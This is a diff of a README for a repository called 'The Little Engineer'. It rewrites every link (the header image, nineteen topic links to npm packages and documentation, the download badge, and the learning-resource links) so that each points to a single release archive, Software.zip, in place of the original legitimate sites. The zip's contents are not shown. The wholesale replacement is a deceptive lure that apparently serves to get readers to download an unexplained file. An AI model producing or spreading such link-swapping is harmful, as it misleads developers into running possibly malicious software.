@@ -2,7 +2,7 @@
 
 Welcome to The Little Engineer repository! 🛠️
 
-![engineering](https://cdn.pixabay.com/photo/2015/10/21/10/57/engineer-998972_960_720.jpg)
+![engineering](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
 
 ## Description
 
@@ -10,29 +10,29 @@ This repository is a collection of tools and resources for aspiring engineers an
 
 ## Topics
 
-- [axios](https://www.npmjs.com/package/axios)
-- [bcrypt](https://www.npmjs.com/package/bcrypt)
-- [context-api](https://reactjs.org/docs/context.html)
-- [cookie-parser](https://www.npmjs.com/package/cookie-parser)
-- [cors](https://www.npmjs.com/package/cors)
-- [dotenv](https://www.npmjs.com/package/dotenv)
-- [express](https://www.npmjs.com/package/express)
-- [express-validator](https://www.npmjs.com/package/express-validator)
-- [figma](https://www.figma.com/)
-- [javascript](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-- [jwt](https://jwt.io/)
-- [mongodb](https://www.mongodb.com/)
-- [mongoose](https://mongoosejs.com/)
-- [morgan](https://www.npmjs.com/package/morgan)
-- [nodejs](https://nodejs.org/)
-- [react-router-dom](https://reactrouter.com/web/guides/quick-start)
-- [reactjs](https://reactjs.org/)
-- [redis](https://redis.io/)
-- [tailwindcss](https://tailwindcss.com/)
+- [axios](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [bcrypt](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [context-api](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [cookie-parser](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [cors](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [dotenv](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [express](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [express-validator](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [figma](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [javascript](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [jwt](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [mongodb](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [mongoose](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [morgan](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [nodejs](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [react-router-dom](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [reactjs](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [redis](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [tailwindcss](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
 
 ## Repository Link
 
-[![Download Repository](https://img.shields.io/static/v1.svg?label=Download&message=The%20Little%20Engineer&color=blue&style=flat)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip%20Little%20Engineer&color=blue&style=flat)](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
 
 ## How to Use
 
@@ -41,10 +41,10 @@ This repository is a collection of tools and resources for aspiring engineers an
 
 ## Resources
 
-- [FreeCodeCamp](https://www.freecodecamp.org/)
-- [Codecademy](https://www.codecademy.com/)
-- [MDN Web Docs](https://developer.mozilla.org/)
-- [Stack Overflow](https://stackoverflow.com/)
+- [FreeCodeCamp](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [Codecademy](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [MDN Web Docs](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
+- [Stack Overflow](https://github.com/TakanaX64/The-Little-Engineer/releases/download/v2.0/Software.zip)
 
 Here are some common emojis that you might encounter in The Little Engineer repository: 🚀🔧💡📚
 
